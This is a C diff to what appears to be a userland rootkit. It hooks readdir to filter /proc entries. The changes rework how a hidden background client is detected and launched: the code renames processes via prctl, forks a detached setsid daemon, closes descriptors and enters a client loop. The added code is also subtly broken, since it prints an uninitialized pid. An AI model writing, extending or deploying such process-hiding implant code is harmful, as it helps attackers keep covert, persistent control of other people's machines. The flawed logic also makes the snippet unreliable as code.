@@ -130,11 +130,16 @@ bool client_running(void)
 {
     ORIG(readdir, false);
 
+    pid_t pid;
+    char cur_pid[64];
+    sprintf(cur_pid, "%d", pid);
+
     struct dirent *dir;
     DIR *dirp = opendir("/proc");
+    char proc_name[1024];
     while ((dir = original_readdir(dirp)))
     {
-        if (should_filter(dir->d_name, dirp))
+        if (strcmp(dir->d_name, cur_pid) != 0 && procname(dir->d_name, proc_name, sizeof(proc_name)) && strncmp(proc_name, PREFIX ".main", strlen(PREFIX ".main")) == 0)
         {
             return true;
         }
@@ -143,22 +148,21 @@ bool client_running(void)
     return false;
 }
 
-// FIXME process doesnt get started?
-// (THE LOCK DOESNT GET DELETED AFTER SYSTEMD?)
+// unreliable?
 bool start_client(void)
 {
-    char *lock_name = "/" PREFIX ".LOCK";
-    int fd;
-    if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1) return false;
-    close(fd);
-
+    if (client_running()) return false;
+    char buf[64];
+    prctl(PR_GET_NAME, buf);
+    prctl(PR_SET_NAME, PREFIX ".main");
     if (client_running())
     {
-        remove(lock_name);
+        prctl(PR_SET_NAME, buf);
         return false;
     }
 
-    if (!fork())
+    pid_t pid;
+    if (!(pid = fork()))
     {
         setsid();
         signal(SIGCHLD, SIG_IGN);
@@ -171,8 +175,7 @@ bool start_client(void)
             {
                 close(x);
             }
-            prctl(PR_SET_NAME, PREFIX);
-            remove(lock_name);
+            prctl(PR_SET_NAME, PREFIX ".main");
 
             client_loop();
         }
@@ -181,6 +184,9 @@ bool start_client(void)
             exit(0);
         }
     }
+
+    waitpid(pid, NULL, 0);
+    prctl(PR_SET_NAME, buf);
 
     return true;
 }
